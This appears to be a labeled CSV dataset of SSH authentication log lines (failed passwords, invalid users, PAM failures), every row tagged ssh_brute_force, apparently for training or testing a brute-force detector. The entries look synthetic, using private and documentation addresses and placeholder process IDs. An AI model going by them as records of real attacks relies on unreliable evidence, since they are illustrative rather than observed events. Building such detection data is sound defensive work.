text,label
Failed password for root from 192.168.1.100 port 22 ssh2,ssh_brute_force
Failed password for admin from 10.0.0.5 port 22 ssh2,ssh_brute_force
Failed password for user from 172.16.0.1 port 22 ssh2,ssh_brute_force
Failed password for root from 203.0.113.50 port 22 ssh2,ssh_brute_force
Failed password for root from 198.51.100.23 port 22 ssh2,ssh_brute_force
Failed password for invalid user test from 10.0.0.1 port 22 ssh2,ssh_brute_force
Failed password for invalid user guest from 192.168.0.10 port 22 ssh2,ssh_brute_force
Failed password for invalid user oracle from 10.10.10.1 port 22 ssh2,ssh_brute_force
Failed password for invalid user postgres from 172.16.5.5 port 22 ssh2,ssh_brute_force
Failed password for invalid user ubuntu from 192.168.100.1 port 22 ssh2,ssh_brute_force
Invalid user admin from 10.0.0.1 port 22,ssh_brute_force
Invalid user test from 192.168.1.50 port 22,ssh_brute_force
Invalid user root from 203.0.113.10 port 22,ssh_brute_force
Invalid user guest from 198.51.100.5 port 22,ssh_brute_force
Invalid user deploy from 172.16.0.100 port 22,ssh_brute_force
Invalid user mysql from 10.0.0.50 port 22,ssh_brute_force
Invalid user ftpuser from 192.168.10.10 port 22,ssh_brute_force
Invalid user pi from 10.10.0.1 port 22,ssh_brute_force
Connection closed by authenticating user root 192.168.1.100 port 22,ssh_brute_force
Connection closed by authenticating user admin 10.0.0.5 port 22,ssh_brute_force
Connection closed by authenticating user test 172.16.0.1 port 22,ssh_brute_force
Connection closed by authenticating user user 203.0.113.50 port 22,ssh_brute_force
pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 ruser= rhost=192.168.1.100 user=root,ssh_brute_force
pam_unix(sshd:auth): authentication failure; logname= uid=0 ruser= rhost=10.0.0.5 user=admin,ssh_brute_force
pam_unix(sshd:auth): authentication failure; rhost=172.16.0.50 user=root,ssh_brute_force
pam_unix(sshd:auth): authentication failure; rhost=203.0.113.10 user=test,ssh_brute_force
sshd[12345]: Failed password for root from 192.168.1.1 port 54321 ssh2,ssh_brute_force
sshd[23456]: Failed password for admin from 10.0.0.100 port 43210 ssh2,ssh_brute_force
